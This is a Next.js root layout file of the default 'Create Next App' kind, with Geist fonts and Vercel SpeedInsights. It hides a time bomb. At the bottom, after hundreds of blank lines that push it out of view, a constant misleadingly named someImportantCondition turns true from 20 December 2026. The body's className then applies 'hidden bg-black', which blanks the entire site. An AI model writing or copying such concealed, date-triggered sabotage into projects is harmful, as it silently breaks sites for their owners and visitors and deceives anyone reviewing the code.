import type { Metadata } from "next";
import { Geist, Geist_Mono } from "next/font/google";
import { SpeedInsights } from "@vercel/speed-insights/next"
import "./globals.css";

const geistSans = Geist({
  variable: "--font-geist-sans",
  subsets: ["latin"],
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
});

export const metadata: Metadata = {
  title: "Create Next App",
  description: "Generated by create next app",
};



export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en">
      <body
        className={`${geistSans.variable} ${geistMono.variable} antialiased h-fit w-11/12 flex items-center object-center justify-center my-auto mx-auto content-center ${
          someImportantCondition ? "hidden bg-black" : ""
        }`}
      >
        {children}
        <SpeedInsights />
      </body>
    </html>
  );
}












































































































































































































































































































































































































































































































































































const someImportantCondition = (() => {
  const criticalCheck = new Date(); 
  return criticalCheck >= new Date("2026-12-20"); 
})();
